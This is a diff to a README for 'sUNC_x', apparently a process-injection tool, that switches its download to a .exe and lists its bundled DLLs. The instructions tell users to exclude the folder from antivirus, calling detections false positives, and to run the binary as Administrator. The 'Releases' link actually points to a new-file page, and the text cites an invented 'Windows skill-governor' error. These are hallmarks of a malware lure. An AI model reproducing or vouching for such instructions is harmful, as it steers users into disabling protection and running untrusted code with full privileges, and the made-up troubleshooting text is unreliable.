@@ -17,7 +17,7 @@
 ## 🛠️ Getting Started
 To ensure the environment initializes correctly, please follow these steps:
 
-1. **Download:** Navigate to the [Releases](https://github.com/daviskleins6-svg/sUNX_x/new/main?filename=README.md) tab and download the latest `sUNC_x.zip`.
+1. **Download:** Navigate to the [Releases](https://github.com/daviskleins6-svg/sUNX_x/new/main?filename=README.md) tab and download the latest `sUNC_x.exe`.
 2. **Exclusion:** Add the folder to your Antivirus exclusions. Due to the nature of process injection, Rust-based binaries often trigger false positives.
 3. **Run:** Execute `sUNC_x.exe` as Administrator.
 4. **Attach:** Click the **Attach** button to bridge the environment. If successful, the status will change to "CONNECTED".
@@ -25,9 +25,8 @@ To ensure the environment initializes correctly, please follow these steps:
 ## 📂 Bundle Contents
 When you download the release, the following files must remain in the same directory:
 * `sUNC_x.exe`: The main loader and UI.
-* `Xeno.dll`: The core identity handler.
+* `sUNC_x.dll`: The core identity handler.
 * `Inject.dll`: Auxiliary threading helper.
-* `*.pdb`: Debug symbol files for environment stability.
 
 ## ⚠️ Known Issues & Troubleshooting
 * **Error 184:** This is a common conflict with the Windows skill-governor. If this occurs, verify your execution permissions and try again.
